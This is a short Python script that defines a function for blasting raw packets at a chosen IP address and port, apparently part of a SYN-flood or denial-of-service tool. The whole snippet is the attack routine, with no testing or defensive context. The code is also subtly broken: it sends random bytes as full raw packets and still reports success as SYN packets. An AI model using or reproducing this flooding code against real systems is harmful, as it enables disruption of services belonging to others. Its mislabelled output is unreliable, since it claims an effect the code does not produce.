import socket
import random
import os

def send_raw_syn(target_ip, port=80, count=1000):
    try:
        for _ in range(count):
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            s.sendto(os.urandom(60), (target_ip, port))
        print(f"✅ Raw SYN packets sent to {target_ip}:{port}")
    except Exception as e:
        print(f"❌ RAW TCP error: {e}")
